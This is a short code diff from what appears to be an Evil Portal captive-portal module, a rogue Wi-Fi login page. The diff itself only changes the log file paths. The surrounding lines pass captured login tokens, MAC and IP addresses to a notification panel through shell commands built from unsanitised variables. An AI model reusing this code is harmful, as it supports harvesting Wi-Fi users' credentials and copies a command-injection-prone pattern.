@@ -47,8 +47,8 @@ class MyPortal extends Portal
             			$this->execBackground("notify $mac' Login:'$rtoken' IP:'$ip"); //notify panel 
            			$this->execBackground("writeLog $mac' - '$rtoken'/n"); //still needed ?
            			parent::handleAuthorization();
-            			unlink("$dir/evilportal-logs/$mac:mail.txt");
-            			unlink("$dir/evilportal-logs/$mac.txt");
+            			unlink("{$logPath}/$mac:mail.txt");
+            			unlink("{$logPath}/$mac.txt");
            		}
      	  }
 	        // Call parent to handle basic authorization first
